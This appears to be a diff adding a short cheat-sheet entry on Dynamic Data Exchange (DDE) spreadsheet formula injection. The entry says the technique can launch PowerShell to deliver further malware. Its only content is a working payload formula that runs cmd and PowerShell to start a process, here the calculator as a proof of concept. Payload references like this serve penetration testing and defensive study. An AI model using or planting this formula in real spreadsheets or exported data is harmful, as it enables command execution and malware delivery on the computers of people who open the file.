@@ -1,0 +1,5 @@
+Dynamic Data Exchange:
+
+Through the beginner level solution, you can execute powershell to launch addition malware/payload
+
+=cmd|'/C powershell /c start-process calc.exe'!Z0
